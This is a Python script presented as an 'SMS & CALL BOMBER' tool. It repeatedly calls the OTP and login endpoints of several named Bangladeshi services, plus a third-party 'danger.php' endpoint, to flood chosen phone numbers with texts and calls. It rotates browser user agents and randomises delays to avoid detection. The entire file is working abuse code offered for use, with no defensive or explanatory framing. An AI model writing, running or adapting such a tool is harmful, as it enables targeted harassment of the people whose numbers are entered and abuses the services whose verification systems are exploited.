import requests
import time
import random
import sys
import os
import json

# ANSI escape codes for colors
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

# ASCII Art Banner
BRAND_ART = f"""
{Colors.CYAN}
              ██████╗ ███╗   ██╗      ██╗███╗   ██╗      ██████╗ ██████╗  ██████╗ 
             ██╔═══██╗████╗  ██║     ██╔╝████╗  ██║     ██╔════╝██╔═══██╗██╔════╝ 
             ██║   ██║██╔██╗ ██║    ██╔╝ ██╔██╗ ██║     ██║     ██║   ██║██║  ███╗
             ██║   ██║██║╚██╗██║   ██╔╝  ██║╚██╗██║     ██║     ██║   ██║██║   ██║
             ╚██████╔╝██║ ╚████║  ██╔╝   ██║ ╚████║     ╚██████╗╚██████╔╝╚██████╔╝
              ╚═════╝ ╚═╝  ╚═══╝  ╚═╝    ╚═╝  ╚═══╝      ╚═════╝ ╚═════╝  ╚═════╝ 
{Colors.YELLOW}
                      ===  SMS & CALL BOMBER TOOL  ===
{Colors.RESET}
{Colors.CYAN}
                      Developed with passion by:
{Colors.GREEN}
                           J N J O Y B R O
{Colors.RESET}
"""

# Random User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

# API List
APIS = [
    {
        "name": "RabbitHole",
        "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
        "method": "POST",
        "body": lambda number: {"mobile": number},
    },
    {
        "name": "Osudpotro",
        "url": "https://api.osudpotro.com/api/v1/users/send_otp",
        "method": "POST",
        "body": lambda number: {"phone": number},
    },
    {
        "name": "Swap",
        "url": "https://api.swap.com.bd/api/v1/send-otp",
        "method": "POST",
        "body": lambda number: {"phone_number": number},
    },
    {
        "name": "Rangs",
        "url": "https://ecom.rangs.com.bd/send-otp-code",
        "method": "POST",
        "body": lambda number: {"mobile": f"+88{number}"},  # Rangs needs +880
    },
    {
        "name": "Black-Team",
        "url": "http://Black-Team.xyz/sms/danger.php?phone={number}",
        "method": "GET",
        "body": None,  # No body, number is in URL
    }
]

def clear_screen():
    try:
        os.system("clear" if os.name == "posix" else "cls")
    except:
        print("\n" * 50)

def validate_phone(phone):
    return phone.strip().isdigit() and len(phone.strip()) == 11 and phone.strip().startswith("01")

def send_request(api, number):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/json"
    }
    try:
        if api["method"] == "POST":
            data = api["body"](number)
            response = requests.post(api["url"], json=data, headers=headers, timeout=10)
        elif api["method"] == "GET":
            url = api["url"].replace("{number}", number)
            response = requests.get(url, headers=headers, timeout=10)
        else:
            print(f"{Colors.RED}Unknown Method!{Colors.RESET}")
            return {"success": False}

        if response.status_code == 200:
            print(f"{Colors.GREEN}[SUCCESS] {api['name']} -> {number}{Colors.RESET}")
            return {"success": True}
        else:
            print(f"{Colors.RED}[FAILED] {api['name']} -> {number}{Colors.RESET}")
            return {"success": False}
    except requests.RequestException:
        print(f"{Colors.RED}[ERROR] {api['name']} -> {number}{Colors.RESET}")
        return {"success": False}

def main():
    clear_screen()
    print(BRAND_ART)

    # Input
    try:
        phone_input = input(f"{Colors.CYAN}Enter Bangladeshi numbers (e.g., 01712345678,01987654321): {Colors.RESET}").strip()
        phone_numbers = [phone.strip() for phone in phone_input.split(",") if validate_phone(phone.strip())]

        if not phone_numbers:
            print(f"{Colors.RED}No valid numbers entered!{Colors.RESET}")
            input("Press Enter to exit...")
            return
    except Exception as e:
        print(f"{Colors.RED}Error in input: {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    try:
        sms_count = int(input(f"{Colors.CYAN}Enter number of SMS per number (0-100): {Colors.RESET}").strip())
        call_count = int(input(f"{Colors.CYAN}Enter number of CALL per number (0-100): {Colors.RESET}").strip())
        if not (0 <= sms_count <= 100 and 0 <= call_count <= 100):
            raise ValueError("Counts must be between 0 and 100")
    except ValueError as e:
        print(f"{Colors.RED}Invalid input! {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    try:
        delay = float(input(f"{Colors.CYAN}Enter delay between requests (seconds): {Colors.RESET}").strip())
        if delay < 0:
            raise ValueError("Delay must be non-negative")
    except ValueError as e:
        print(f"{Colors.RED}Invalid delay! {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Process
    for phone in phone_numbers:
        request_list = []
        request_list.extend(["sms"] * sms_count)
        request_list.extend(["call"] * call_count)
        random.shuffle(request_list)

        print(f"\n{Colors.YELLOW}Bombing {phone}{Colors.RESET}")

        for req_type in request_list:
            api = random.choice(APIS)
            send_request(api, phone)
            time.sleep(delay + random.uniform(0, 1))  # Slight random delay

    print(f"\n{Colors.GREEN}Bombing completed!{Colors.RESET}")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Stopped by user.{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}Unexpected error: {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")